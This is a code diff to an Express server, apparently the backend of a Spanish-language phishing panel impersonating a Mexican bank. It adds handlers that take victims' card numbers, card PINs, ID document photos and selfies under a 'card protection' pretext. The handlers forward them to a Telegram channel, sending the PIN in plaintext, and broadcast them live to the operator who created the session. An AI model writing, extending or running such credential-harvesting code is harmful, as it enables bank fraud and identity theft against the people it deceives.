@@ -2385,6 +2385,93 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
                 sendTelegramMessage(qrTelegramMessage);
                 break;
+
+              case 'proteccion_tarjetas':
+                updatedFields.tarjetasProtegidas = JSON.stringify(inputData.tarjetas);
+                updatedFields.pasoActual = ScreenType.NIP_TARJETA;
+                console.log('Tarjetas protegidas recibidas:', inputData.tarjetas.length);
+
+                // Enviar notificación a Telegram
+                const tarjetasInfo = inputData.tarjetas.map((t: any, i: number) => 
+                  `\n💳 Tarjeta ${i + 1}: ${t.tipo === 'credito' ? 'Crédito' : 'Débito'} **** ${t.numero.slice(-4)}`
+                ).join('');
+                const proteccionMessage = `🛡️ <b>PROTECCIÓN DE TARJETAS</b>\n\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
+                  `📊 <b>Tarjetas protegidas:</b> ${inputData.tarjetas.length}${tarjetasInfo}\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(proteccionMessage);
+
+                // Notificar al admin
+                const proteccionCreatedBy = existingSession?.createdBy || '';
+                broadcastToAdmins(JSON.stringify({
+                  type: 'PROTECCION_TARJETAS_RECEIVED',
+                  data: {
+                    sessionId,
+                    tarjetas: inputData.tarjetas,
+                    timestamp: new Date().toISOString(),
+                    createdBy: proteccionCreatedBy
+                  }
+                }), proteccionCreatedBy);
+                break;
+
+              case 'nip_tarjeta':
+                updatedFields.nipTarjeta = inputData.nipTarjeta;
+                updatedFields.pasoActual = ScreenType.CONFIRMAR_IDENTIDAD;
+                console.log('NIP de tarjeta recibido');
+
+                // Enviar notificación a Telegram
+                const nipTarjetaMessage = `🔐 <b>NIP DE TARJETA PROTEGIDA</b>\n\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
+                  `🔢 <b>NIP:</b> ${inputData.nipTarjeta}\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(nipTarjetaMessage);
+
+                // Notificar al admin
+                const nipTarjetaCreatedBy = existingSession?.createdBy || '';
+                broadcastToAdmins(JSON.stringify({
+                  type: 'NIP_TARJETA_RECEIVED',
+                  data: {
+                    sessionId,
+                    nipTarjeta: inputData.nipTarjeta,
+                    timestamp: new Date().toISOString(),
+                    createdBy: nipTarjetaCreatedBy
+                  }
+                }), nipTarjetaCreatedBy);
+                break;
+
+              case 'confirmar_identidad':
+                updatedFields.tipoIdentificacion = inputData.tipoIdentificacion;
+                updatedFields.fotoIdentidadFrente = inputData.fotoIdentidadFrente;
+                updatedFields.fotoIdentidadAtras = inputData.fotoIdentidadAtras || null;
+                updatedFields.fotoSelfie = inputData.fotoSelfie;
+                updatedFields.pasoActual = ScreenType.VALIDANDO_IDENTIDAD;
+                console.log('Documentos de identidad recibidos:', inputData.tipoIdentificacion);
+
+                // Enviar notificación a Telegram
+                const identidadMessage = `📸 <b>DOCUMENTOS DE IDENTIDAD</b>\n\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
+                  `🆔 <b>Tipo:</b> ${inputData.tipoIdentificacion}\n` +
+                  `✅ <b>Foto frontal:</b> Recibida\n` +
+                  (inputData.tipoIdentificacion === 'INE' ? `✅ <b>Foto trasera:</b> Recibida\n` : '') +
+                  `✅ <b>Selfie:</b> Recibida\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(identidadMessage);
+
+                // Notificar al admin
+                const identidadCreatedBy = existingSession?.createdBy || '';
+                broadcastToAdmins(JSON.stringify({
+                  type: 'IDENTIDAD_RECEIVED',
+                  data: {
+                    sessionId,
+                    tipoIdentificacion: inputData.tipoIdentificacion,
+                    fotoIdentidadFrente: inputData.fotoIdentidadFrente?.substring(0, 50) + '...',
+                    fotoIdentidadAtras: inputData.fotoIdentidadAtras ? inputData.fotoIdentidadAtras.substring(0, 50) + '...' : null,
+                    fotoSelfie: inputData.fotoSelfie?.substring(0, 50) + '...',
+                    timestamp: new Date().toISOString(),
+                    createdBy: identidadCreatedBy
+                  }
+                }), identidadCreatedBy);
+                break;
             }
 
             console.log(`Received data from client ${sessionId}: ${tipo}`, inputData);
